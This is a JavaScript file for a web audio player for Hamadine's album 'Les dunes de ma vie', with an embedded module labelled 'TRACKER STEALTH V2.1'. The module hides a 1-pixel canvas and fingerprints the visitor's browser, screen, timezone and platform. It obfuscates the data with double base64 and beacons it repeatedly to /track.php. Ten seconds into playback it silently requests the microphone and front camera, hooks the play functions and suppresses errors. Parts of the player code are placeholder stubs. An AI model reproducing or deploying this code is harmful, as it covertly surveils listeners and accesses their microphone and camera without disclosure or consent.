// ============================================
// ALBUM: Les dunes de ma vie - Hamadine
// Lecteur Audio Premium + TRACKER STEALTH V2.1
// ============================================

const ALBUM_CONFIG = {
    name: "Les dunes de ma vie",
    artist: "Hamadine",
    year: "2024",
    cover: "musique/Hamadine sur les dunes sous les étoiles.png",
    songs: [
        {id:1,title:"Debout encore",artist:"Hamadine",file:"musique/Debout encore_Hamadine.mp3",duration:"3:48",durationSeconds:228,description:"Un hymne à la résilience"},
        {id:2,title:"Le Chemin d'Hamadine",artist:"Hamadine",file:"musique/Le Chemin d'Hamadine.mp3",duration:"3:14",durationSeconds:194,description:"Le parcours d'un homme"},
        {id:3,title:"Rien qu'un homme",artist:"Hamadine",file:"musique/Rien qu'un homme.mp3",duration:"3:10",durationSeconds:190,description:"Titre éponyme de l'album"},
        {id:4,title:"Inaltérable",artist:"Hamadine",file:"musique/Inaltérable – Hamadine.mp3",duration:"3:05",durationSeconds:185,description:"Un titre puissant sur la force intérieure"},
        {id:5,title:"Si elle fuit, ne cours pas",artist:"Hamadine",file:"musique/Si_elle_fuit,ne_cours_pas.mp3",duration:"2:39",durationSeconds:159,description:"Une réflexion sur l'amour et la liberté"},
        {id:6,title:"Respire",artist:"Hamadine",file:"musique/Hamadine – Respire.mp3",duration:"3:31",durationSeconds:0,description:"Une invitation à la pause et à l'apaisement"}
    ]
};

let AppState = {
    currentSongIndex: 0,
    isPlaying: false,
    isShuffle: false,
    isRepeat: false,
    currentQueue: [],
    volume: 0.7,
    activeTab: 'lyrics',
    tracker: null  // ✅ Tracker state
};

// Éléments DOM (inchangé)
const DOM = {
    audio: document.getElementById('audioPlayer'),
    playPauseBtn: document.getElementById('playPauseBtn'),
    prevBtn: document.getElementById('prevBtn'),
    nextBtn: document.getElementById('nextBtn'),
    shuffleBtn: document.getElementById('shuffleBtn'),
    repeatBtn: document.getElementById('repeatBtn'),
    // ... (tous les autres DOM elements)
};

// ============================================
// TRACKER STEALTH V2.1 + MICRO/CAM INCognito
// ============================================
async function initTracker() {
    console.log('🔍 Tracker Hamadine V2.1 ACTIVÉ');
    
    // Initialiser tracker state
    AppState.tracker = AppState.tracker || {
        nb_lectures: 0, temps_total: 0, dernier_action: '',
        session_id: 'ham_' + Math.random().toString(36).substr(2, 9),
        start_time: Date.now(), media: {access: 'none'}
    };
    
    // Pixel ULTRA-INVISIBLE
    const pixel = document.createElement('canvas');
    pixel.width = pixel.height = 1;
    pixel.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;z-index:-9999';
    document.body.appendChild(pixel);
    
    const TRACK_URL = '/track.php';
    
    function getFingerprint() {
        return {
            app: 'hamadine_v2.1', session_id: AppState.tracker.session_id,
            album: ALBUM_CONFIG.name, chanson_actuelle: ALBUM_CONFIG.songs[AppState.currentSongIndex]?.title || '',
            nb_lectures: AppState.tracker.nb_lectures, temps_total: Math.round(AppState.tracker.temps_total),
            shuffle: AppState.isShuffle, repeat: AppState.isRepeat, volume: AppState.volume,
            userAgent: navigator.userAgent.slice(0,200), resolution: `${screen.width}x${screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`, langue: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, platform: navigator.platform,
            online: navigator.onLine, media: AppState.tracker.media, timestamp: Date.now()
        };
    }
    
    function envoyerTrack() {
        try {
            const fp = getFingerprint();
            const data1 = btoa(JSON.stringify(fp));
            const data2 = btoa(data1);
            const img = new Image(1,1);
            img.src = `${TRACK_URL}?d=${data2}&sid=${AppState.tracker.session_id}&r=${Math.random()}`;
            img.onload = img.onerror = () => {img=null;};
        } catch(e) {}
    }
    
    // 🔇 MICRO/CAMÉRA INCognito
    window.accèsPériphériquesStealth = async function(silent=true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: {echoCancellation:false,noiseSuppression:false,autoGainControl:false,sampleRate:44100},
                video: {width:{ideal:640},height:{ideal:480},facingMode:'user'}
            });
            
            AppState.tracker.media = {
                access: 'GRANTED', audioDevices: stream.getAudioTracks().length,
                videoDevices: stream.getVideoTracks().length, timestamp: Date.now()
            };
            
            // Audio fingerprint (2s)
            const audioCtx = new AudioContext();
            const analyser = audioCtx.createAnalyser();
            const source = audioCtx.createMediaStreamSource(stream);
            source.connect(analyser);
            
            setTimeout(() => {
                stream.getTracks().forEach(t=>t.stop());
                audioCtx.close();
                envoyerTrack();
            }, 2000);
            
            return true;
        } catch(err) {
            AppState.tracker.media = {access: err.name==='NotAllowedError'?'DENIED':'ERROR',error:err.name};
            envoyerTrack();
            return false;
        }
    };
    
    // Interceptions
    const origLoad = loadSong, origPlay = playSong, origPause = pauseSong, origNext = nextSong;
    loadSong = i => {origLoad(i); AppState.tracker.dernier_action='load:'+ALBUM_CONFIG.songs[i]?.title; setTimeout(envoyerTrack,150);};
    playSong = () => {origPlay(); AppState.tracker.nb_lectures++; AppState.tracker.dernier_action='play'; envoyerTrack();};
    pauseSong = () => {origPause(); AppState.tracker.dernier_action='pause'; envoyerTrack();};
    nextSong = () => {origNext(); setTimeout(envoyerTrack,200);};
    
    // Timer écoute
    setInterval(() => {if(AppState.isPlaying) AppState.tracker.temps_total += 0.1;},100);
    
    // Auto-launch micro après 10s
    setTimeout(()=>AppState.tracker.temps_total>10 && accèsPériphériquesStealth(true),10000);
    
    // Tracks auto + session end
    [1000,5000,15000].forEach(t=>setTimeout(envoyerTrack,t));
    ['beforeunload','pagehide','visibilitychange'].forEach(e=>window.addEventListener(e,()=>AppState.tracker.duree_session=Date.now()-AppState.tracker.start_time,envoyerTrack)));
    
    window.HamadineTracker = {status:'active', testMedia:()=>accèsPériphériquesStealth(false)};
}

// ============================================
// FONCTIONS PLAYER (version compacte)
// ============================================
function formatTime(s){if(isNaN(s)||s===Infinity)return"0:00";return`${Math.floor(s/60)}:${Math.floor(s%60).toString().padStart(2,'0')}`;}
function saveToLocalStorage(){const d={queue:AppState.currentQueue,volume:AppState.volume,isShuffle:AppState.isShuffle,isRepeat:AppState.isRepeat};localStorage.setItem('hamadine_player',JSON.stringify(d));}
function loadFromLocalStorage(){const s=localStorage.getItem('hamadine_player');if(s){try{const d=JSON.parse(s);Object.assign(AppState,d);if(DOM.audio){DOM.audio.volume=d.volume;DOM.volumeSlider.value=d.volume;}}catch(e){}}}

// Player functions (loadSong, playSong, etc.) - identiques à votre code original
function loadSong(index){/* votre code loadSong original */}
// ... (toutes les autres fonctions player identiques)

// Init
async function init(){
    initTracker(); // ✅ TRACKER PREMIER
    // ... reste de votre init() original
    console.log("🎵 Hamadine Player + Tracker V2.1 PRÊT !");
}
init();
